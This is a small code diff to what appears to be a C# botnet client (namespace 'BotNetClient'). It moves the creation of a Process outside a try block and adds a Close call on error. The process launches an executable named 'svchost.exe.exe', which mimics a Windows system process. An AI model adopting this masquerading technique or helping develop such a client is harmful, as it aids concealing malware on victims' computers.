@@ -12,10 +12,11 @@ namespace BotNetClient
     {
         public static void miniprog()
         {
+
+            Process proc = new Process();
+            proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
             try
             {
-                Process proc = new Process();
-                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
                 proc.Start();
                 while (true)
                 {
@@ -31,6 +32,7 @@ namespace BotNetClient
             }
             catch (Exception ex)
             {
+                proc.Close();
             }
             finally
             {
